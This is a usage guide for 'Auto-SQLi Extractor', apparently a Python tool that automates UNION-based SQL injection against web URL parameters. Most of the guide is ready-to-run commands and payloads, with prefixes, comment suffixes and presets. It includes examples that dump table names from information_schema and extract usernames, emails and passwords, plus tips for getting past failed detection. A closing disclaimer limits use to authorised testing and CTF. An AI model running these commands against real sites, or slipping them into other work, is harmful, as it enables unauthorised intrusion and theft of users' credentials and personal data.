# Auto-SQLi Extractor - Usage Guide

## Overview
**Auto-SQLi Extractor** is an automated tool for exploiting SQL Injection vulnerabilities. The tool automatically:
- [OK] Detects number of columns in database
- [OK] Finds columns that can display data
- [OK] Extracts data from database

---

## Installation

### Requirements
- Python 3.8+
- requests library

### Install Dependencies
```bash
pip install -r requirements.txt
```

---

## How to Use

### 1. View Preset List
```bash
python main.py --list-presets
```

### 2. Basic Syntax
```bash
python main.py -u "URL_VULNERABLE" [OPTIONS]
```

### 3. Injection Types (Presets)

#### A. Numeric Injection (Parameter is number)
```bash
python main.py -u "http://site.com/page.php?id=999" \
  --preset numeric \
  -d "database()" \
  -T "users"
```

**When to use:**
- Parameter is number: `?id=1`, `?product=123`
- Server doesn't use quotes around parameter

**Example original SQL:**
```sql
SELECT * FROM products WHERE id = 1
```

**With payload:**
```sql
SELECT * FROM products WHERE id = 999 LIMIT 1
-- Or: SELECT * FROM products WHERE id = 999 UNION SELECT ... LIMIT 1
```

---

#### B. Numeric Comment (Number parameter + comment)
```bash
python main.py -u "http://site.com/page.php?id=1" \
  --preset numeric-comment \
  -d "version()"
```

**When to use:**
- Parameter is number but need to bypass WHERE condition
- Need to comment out rest of query

**Default suffix:** `-- -` (MySQL comment)

---

#### C. Quote-Based (String parameter)
```bash
python main.py -u "http://site.com/page.php?name=admin" \
  --preset quote \
  -d "user()" \
  -T "users"
```

**When to use:**
- Parameter in quotes: `?name='admin'`
- SQL query: `WHERE name = 'admin'`

**Payload:**
```sql
WHERE name = 'admin' UNION SELECT ... -- -'
```

---

### 4. Custom Parameters

If you don't want to use preset, you can customize:

```bash
python main.py -u "http://site.com/page.php?id=1" \
  -p ""          \
  -s "LIMIT 1"   \
  -d "database()" \
  -T "users"
```

**Parameters:**
- `-p, --prefix`: Closing character (e.g. `'` or `"`) 
- `-s, --suffix`: Comment syntax (e.g. `-- -`, `#`, `LIMIT 1`)
- `-d, --dump`: SQL to execute (e.g. `database()`, `version()`)
- `-T, --table`: Table name (e.g. `users`, `products`)

---

## Real World Examples

### Example 1: Get database name
```bash
python main.py -u "http://target.com/page.php?id=1" --preset numeric
```

**Output:**
```
[V] SUCCESSFULLY PWNED! EXTRACTED RESULT:
=========================================
 > mydb
=========================================
```

### Example 2: Get table list
```bash
python main.py \
  -u "http://target.com/page.php?id=999" \
  --preset numeric \
  -d "group_concat(table_name)" \
  -T "information_schema.tables"
```

**Output:**
```
 > users,products,orders,payments
```

### Example 3: Get data from Users table
```bash
python main.py \
  -u "http://target.com/page.php?id=999" \
  --preset numeric \
  -d "group_concat(username,'|',email,'|',password)" \
  -T "users"
```

**Output:**
```
 > admin|admin@mail.com|hashed_password
 > user1|user1@mail.com|hash123
 > user2|user2@mail.com|hash456
```

### Example 4: Get MySQL user & version
```bash
python main.py \
  -u "http://target.com/page.php?id=999" \
  --preset numeric \
  -d "CONCAT(user(),'|',version())"
```

**Output:**
```
 > root@localhost|8.0.22
```

---

## Troubleshooting

### Error: "Cannot find column count"

**Reason:** Tool could not detect SQL injection

**How to fix:**

1. **Change suffix:**
```bash
--suffix "-- +"
--suffix "#"
--suffix "LIMIT 1"
--suffix "/*"
```

2. **Change preset:**
```bash
--preset quote
--preset quote-paren
--preset numeric-comment
```

3. **Use non-existent value:**
```bash
# Change ?id=1 to ?id=999 or ?id=-1
python main.py -u "http://site.com/page.php?id=999" --preset numeric
```

4. **Try custom prefix:**
```bash
-p "'"    # Single quote
-p "\""   # Double quote
-p "')"   # Quote and parenthesis
```

---

### Error: "Cannot find Text column to print"

**Reason:** Column detection works but cannot find column to display

**How to fix:**

1. Change suffix:
```bash
--suffix "-- +"
--suffix "#"
```

2. Make sure you use non-existent value (999 or -1)

3. Try different preset

---

### Server Returns Error

**Reason:** SQL syntax is incorrect

**Solution:**
- Prefer UNION-based instead of Boolean-based
- Check URL has no special characters that need encoding
- Try different presets

---

## Common SQL Functions

| Function | Purpose | Example |
|----------|---------|---------|
| `database()` | Current database name | `-d "database()"` |
| `user()` | Current user | `-d "user()"` |
| `version()` | MySQL version | `-d "version()"` |
| `table_name` | Table name | `-d "group_concat(table_name)" -T "information_schema.tables"` |
| `column_name` | Column name | `-d "group_concat(column_name)" -T "information_schema.columns"` |
| `group_concat()` | Concatenate results with comma | `-d "group_concat(username,'|',password)"` |
| `CONCAT()` | Concatenate strings | `-d "CONCAT(id,'|',name)"` |

---

## Preset Comparison Table

| Preset | Prefix | Suffix | When to Use |
|--------|--------|--------|-------------|
| numeric | `` | `LIMIT 1` | Numeric parameter, use LIMIT |
| numeric-comment | `` | `-- -` | Numeric parameter, use comment |
| quote | `'` | `-- -` | String parameter |
| quote-paren | `')` | `-- -` | Parameter in function |
| double-quote | `"` | `-- -` | Double-quoted string |
| backtick | `` ` `` | `-- -` | Backtick identifier |

---

## Tips & Tricks

1. **Always try non-existent value:** `id=999` instead of `id=1`
2. **Use presets first:** Faster than custom parameters
3. **Check table_schema:** To find other databases
4. **Use GROUP_CONCAT():** To extract multiple rows at once
5. **Try character encoding:** URL-encoding can affect results

---

## Upcoming Features

- [ ] Auto-detect injection type
- [ ] Boolean-based blind SQL injection
- [ ] Time-based blind SQL injection
- [ ] Multi-query support
- [ ] Table structure explorer
- [ ] Password hash cracking integration

---

## Disclaimer

[WARNING] ONLY USE FOR LEGAL PURPOSES

This tool is created for:
- Security testing (with owner permission)
- Learning & research
- Capture The Flag (CTF)

**Cấm sử dụng:**
- Tấn công các hệ thống không được phép
- Trộm dữ liệu cá nhân
- Bất kỳ hoạt động bất hợp pháp nào

**Tác giả không chịu trách nhiệm** cho bất kỳ thiệt hại nào từ việc sử dụng tool này.

---

## Support & Issues

Nếu gặp vấn đề:
1. Xem phần "Troubleshooting"
2. Thử presets khác nhau
3. Đảm bảo URL đúng format
4. Kiểm tra connection internet

---

**Made with ❤️ by tunadafish**  
*Auto-SQLi Extractor v1.0*
